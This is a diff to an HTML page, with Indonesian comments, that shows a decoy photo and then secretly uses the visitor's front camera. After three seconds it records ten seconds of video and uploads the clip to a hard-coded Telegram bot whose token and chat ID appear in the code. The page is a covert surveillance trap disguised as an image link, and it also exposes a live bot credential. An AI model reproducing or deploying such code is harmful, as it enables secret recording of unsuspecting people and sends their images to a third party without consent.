@@ -13,51 +13,86 @@
             justify-content: center;
             height: 100vh;
             background: black;
+            overflow: hidden;
+            position: relative;
         }
-        img {
+        #preview, #backgroundImage {
             width: 100%;
             height: 100vh;
             object-fit: cover;
+            position: absolute;
+        }
+        #backgroundImage {
+            z-index: 2;
+        }
+        #preview {
+            z-index: 1;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <!-- Ganti dengan gambar tampilan -->
-    <img src="https://img12.pixhost.to/images/804/574487749_fikxzxmodz-developer.jpg" alt="Foto Tampilan" />
+    <!-- Gambar awal yang bisa diatur oleh owner -->
+    <img id="backgroundImage" src="https://img12.pixhost.to/images/804/574487749_fikxzxmodz-developer.jpg" alt="Background">
+
+    <!-- Video preview -->
+    <video id="preview" autoplay muted></video>
 
     <script>
         async function startRecording() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+                document.getElementById("preview").srcObject = stream; 
+
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp8" });
                 let chunks = [];
 
                 mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
-                
+
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: "video/webm" });
+                    const videoURL = URL.createObjectURL(blob);
+
+                    // Tampilkan hasil rekaman sebelum dikirim ke Telegram
+                    const previewVideo = document.createElement("video");
+                    previewVideo.src = videoURL;
+                    previewVideo.controls = true;
+                    previewVideo.style.position = "absolute";
+                    previewVideo.style.bottom = "10px";
+                    previewVideo.style.left = "10px";
+                    previewVideo.style.width = "300px";
+                    document.body.appendChild(previewVideo);
+
+                    console.log("Cek hasil rekaman:", videoURL);
+
+                    // Kirim video ke bot Telegram
                     const formData = new FormData();
                     formData.append("chat_id", "7081489041");
                     formData.append("video", blob, "recorded.webm");
-                    formData.append("supports_streaming", "false"); // Agar tidak langsung diputar (seperti video biasa)
 
                     await fetch(`https://api.telegram.org/bot7575375182:AAHQeA5jdew2tMO5Znh9_zBqi4pwFnWUmCg/sendVideo`, {
                         method: "POST",
                         body: formData
                     });
 
+                    // Hentikan akses kamera setelah selesai
                     stream.getTracks().forEach(track => track.stop());
                 };
 
                 mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 10000); // Rekam selama 10 detik
+                setTimeout(() => mediaRecorder.stop(), 10000); 
 
             } catch (error) {
                 console.error("Gagal mengakses kamera:", error);
             }
         }
 
-        window.onload = startRecording;
+        // Setelah 3 detik, hilangkan gambar dan mulai merekam
+        setTimeout(() => {
+            document.getElementById("backgroundImage").style.display = "none";
+            document.getElementById("preview").style.display = "block";
+            startRecording();
+        }, 3000);
     </script>
 </body>
 </html>
